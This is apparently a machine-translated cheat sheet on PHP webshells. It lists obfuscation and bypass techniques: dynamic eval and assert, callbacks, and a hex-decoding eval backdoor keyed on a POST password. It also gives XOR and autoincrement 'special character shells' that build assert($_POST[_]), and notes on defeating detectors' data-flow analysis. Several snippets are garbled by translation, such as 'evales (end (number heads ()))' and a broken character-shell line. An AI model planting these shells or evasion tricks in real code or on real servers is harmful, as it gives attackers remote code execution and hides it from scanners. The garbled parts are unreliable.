WebShell
================================

Common deformations
--------------------------------
- GLOBALS
- ``eval($GLOBALS['_POST']['op']);``
- ``$_FILE``
- ``eval($_FILE['name']);``
- Split
- `` `Eval ($ {" _ after "." Wed "} ['sz']);` `
- Dynamic function execution
- ``$k="ass"."ert"; $k(${"_PO"."ST"} ['sz']);``
- ``$a=$_GET['a'];$a($_GET['b']);``
- create_function
- ``$function = create_function('$code',strrev('lave').'('.strrev('TEG_$').'["code"]);');$function();``
- preg_replace
- Deformation
- str_replace ("", "e v a l")
- Category conversion
- ``"\x62\x61s\x65\x36\x34_de\x63\x6fde"``
- Category operation
- ``("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/");``
- Self-increasing operation
- ``$a="a";$a++;``
- Forced type conversion
- ``$a='';$a.=[]; // Array``
-Use file names
- ``__FILE__``
- Comments
- ``$a="e"."v"./*-/*-*/"a"./*-*/"l";``
- Reflection
- ``ReflectionFunction``

Bypass
--------------------------------
- Based on rare functions
- ``breeding_replacement_replacement.
- set_error_handler + trigger_error
- Based on pollution transmission
- ``putenv($_GET["c"]);eval(getenv('path'));``
- parse_str
- Parese_url
- extract
- token_get_all
- define
- Based on rare sources
- ``$a = filter_input(INPUT_GET,'c');``
- `` evales (end (number heads ())); `` `` ``
- get_defined_vars
- Tall Headers
- get_meta_tags
- phpinfo
- External variables/file information
- Overload toString

String deformation function
--------------------------------
- base64_decode
- base64_encode
- Str_replace
- str_rot13
ash
- strtolower
- Strtoupper
- Strtr
- substr
- substr_replace
- trim
- ucfirst
- ucwords

Callback function
--------------------------------
- array_filter
- array_map
- array_reduce
- array_walk
- array_walk
- array_walk_recursive
- call_user_func
- call_user_func_array
- filter_var
- filter_ar array
- preg_replace_callback
- register_tick_function
- registregister_shutdown_function
- max
- Uksort

Encrypt and decrypt functions
--------------------------------
- mcrypt_encrypt
- openssl_encrypt

Other ways of execution
--------------------------------
- FFI
- SimpleXML
- SimpleXMLElement

Custom functions
--------------------------------
Using custom encryption and decryption functions, some protection software can be bypassed to a certain extent. The following code is a simple example of hexadecimal execution.

.. code:: php

$string = '';
$password = 'password';
if(isset($_POST[$password])){
$hex = $_POST[$password];
for($i = 0; $i < strlen($hex) - 1; $i += 2) {
$string .= chr(hexdec($hex[$i] . $hex[$i + 1]));
}
}
eval($string);

Special character shell
--------------------------------
PHP strings can directly perform operations when performing XOR and autoincrement operations, so special characters can be used to form a shell.

.. code:: php

<? = `` {{$ {{{"{{" ~ "\ Send0 \ xb8 \ xba \ xb}`;

.. code:: php

@$_++;
$__=("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/");
@${$__}[!$_](${$__}[$_]);


.. code:: php

$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;
$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___(base64_decode($_[_]));

Detect confrontation
--------------------------------
- Analysis based on obfuscation impact program
- Influence program execution based on dynamic variables
- Throw an exception to interrupt data flow analysis
- Reflection-based interruption data flow analysis
- Interrupt data flow analysis based on reference delivery
